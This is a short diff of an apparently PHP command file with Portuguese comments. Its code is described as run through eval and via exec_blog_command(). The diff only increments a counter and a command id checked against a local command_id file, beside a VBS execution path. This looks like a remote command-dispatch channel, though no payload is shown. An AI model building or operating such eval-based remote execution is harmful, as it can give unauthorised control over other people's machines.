@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****22
+****23
 
 [GIT_COMMAND]
 
@@ -358,7 +358,7 @@ if(1)
 		if($execlol && $vbs_exec_path)
 		{
 			$output = array();
-			$new_command_id = '10009';
+			$new_command_id = '10010';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
 			if(@file_get_contents($path_control_id) !== $new_command_id)
 			{
